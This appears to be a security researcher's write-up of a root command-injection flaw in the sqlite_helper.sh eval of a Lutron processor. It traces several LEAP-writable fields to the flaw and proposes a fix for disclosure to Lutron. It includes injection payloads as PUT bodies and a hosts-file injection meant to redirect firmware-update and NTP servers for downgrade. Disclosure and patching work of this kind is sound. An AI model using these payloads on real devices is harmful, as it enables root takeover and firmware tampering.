# LEAP → sqlite_helper.sh eval: broader than the NTP vector

> Extends [phoenix-root.md](phoenix-root.md), which documents the NTP-URL
> root RCE. This doc covers the **other LEAP-controllable fields** that
> reach the same `eval` sink.

## Root cause (recap)

`usr/sbin/sqlite_helper.sh` line 42:
```sh
eval "${__return_result}='${sqlite_result}'"
```

Any value stored in SQLite and retrieved through `execute_sqlite_query` flows
through this unquoted single-quoted eval. A `'` in the stored value breaks
out of the quoting → remainder executes as root.

## Vectors beyond NTP

The NTP path (`/service/ntpserver/1` → `NtpPreferredUrl` → `getNtpUrl.sh` →
chrony reload trigger) was documented. The same sink is reachable via at
least **four additional LEAP-writable fields**, each with its own trigger.

| DB field | SQLite reader | Downstream applier | Trigger | LEAP write endpoint (likely) |
|---|---|---|---|---|
| `NetworkSettings.CustomHostname` | `getHostname.sh` | `applyHostname.sh` | boot, network reconfig | `/networkinterface/{id}` UPDATE |
| `Domain.TimeZoneString` | `getTimeZoneSetting.sh` | `loadTimezone.sh` | tz config change | `/system` UPDATE (TimeZone field) |
| `NetworkInterfaceSettings.StaticIPv6Address` | `getIpv6StaticAddress.sh` | `updateIpv6StaticSettings.sh` | IPv6 static enable/refresh | `/networkinterface/{id}` UPDATE |
| `ProxyProperties.Hostname` | `getProxyClientSettings.sh` | `check_socks_proxy_daemon.sh` | **monit periodic check** | `/system/proxy` (or similar) UPDATE |

The **proxy vector is the most operationally dangerous** — `check_socks_proxy_daemon.sh`
is wired into `/etc/monitrc`:

```
check program socks_proxy_client with path /usr/sbin/check_socks_proxy_daemon.sh
  start program = "/etc/init.d/S14-lutron-socks-client start" with timeout 10 seconds
  ...
```

monit runs checks at its default interval (30 seconds), so setting a
malicious `ProxyProperties.Hostname` via LEAP executes the payload
**automatically within ~30–60 seconds** — no need to trigger any reload.

The NTP payload from `phoenix-root.md` works unchanged — just substitute the
destination field:

```json
// Timezone variant
PUT /system {"Body":{"System":{"TimeZone":"'; id > /tmp/pwned; echo '"}}}

// Hostname variant
PUT /networkinterface/1 {"Body":{"NetworkInterface":{"Hostname":"'; id > /tmp/pwned; echo '"}}}
```

(Exact LEAP body shapes should be confirmed against `leapobj.NetworkInterfaceUpdate`
and `leapobj.SystemUpdate` in `data/firmware-re/leap-types.json` before
weaponizing.)

## Secondary sink: applyHostname.sh heredoc injection

Even if `sqlite_helper.sh` were patched, `applyHostname.sh` introduces a
second injection point:

```sh
createHostsFile() {
   local host_name=$1
   local hosts_file="/tmp/etc/hosts"
   cat <<- _EOF_ > $hosts_file
127.0.0.1 localhost.localdomain localhost
127.0.0.1 $host_name
::1 localhost
fe80::1%lo0 localhost
_EOF_
}
```

A hostname containing embedded newlines injects arbitrary lines into
`/tmp/etc/hosts` — **DNS hijack** usable for firmware-update or
NTP-endpoint MITM. Example malicious hostname:

```
evil\n127.0.0.1 firmwareupdates.lutron.com\n127.0.0.1 time.iot.lutron.io
```

Result: processor resolves Lutron's firmware and NTP servers to localhost,
enabling downgrade or further tampering via attacker-run local servers.

## Additional sqlite_helper.sh consumers worth reviewing

The following scripts also call `execute_sqlite_query`. Need to audit each
for: (1) is the field LEAP-writable? (2) what script consumes the output
and how is it used downstream?

- `getUnsecuredIplEnabledStatus.sh` (boolean — low-value)
- `getNtpServerType.sh` (enum — may be controllable)
- `getNetworkConfigurationForAllInterfaces.sh`
- `getNetworkConfigurationForInterface.sh`
- `getIPLBroadcastSettings.sh` (port/multicast address — numeric, low value)
- `getPlatformDatabaseSourceRevision.sh` (DB metadata, not user-writable)
- `getPlatformDatabaseVersion.sh` (DB metadata)

## Suggested mitigation (for reporting to Lutron)

The fix is trivial — two-line change in `sqlite_helper.sh`:

```sh
# Before (line 42):
eval "${__return_result}='${sqlite_result}'"

# After:
eval "${__return_result}=\$sqlite_result"   # or use printf -v in bash
```

This eliminates the shell-injection surface for *all* consumers at once,
regardless of whether the stored value passes through future LEAP paths not
yet audited. The current field-by-field fix (as applied in some earlier
releases for specific known vectors) doesn't scale.

## Status

- Root cause identified, multi-vector confirmed from source read.
- Not yet weaponized — exact LEAP UPDATE body shapes need live-processor
  validation for `/networkinterface/{id}`, `/system`, `/system/proxy`.
- Safe-to-test on a dev processor: the payload `'; : ; echo '` is a no-op
  that still flows through eval and reveals vulnerability without side
  effects.
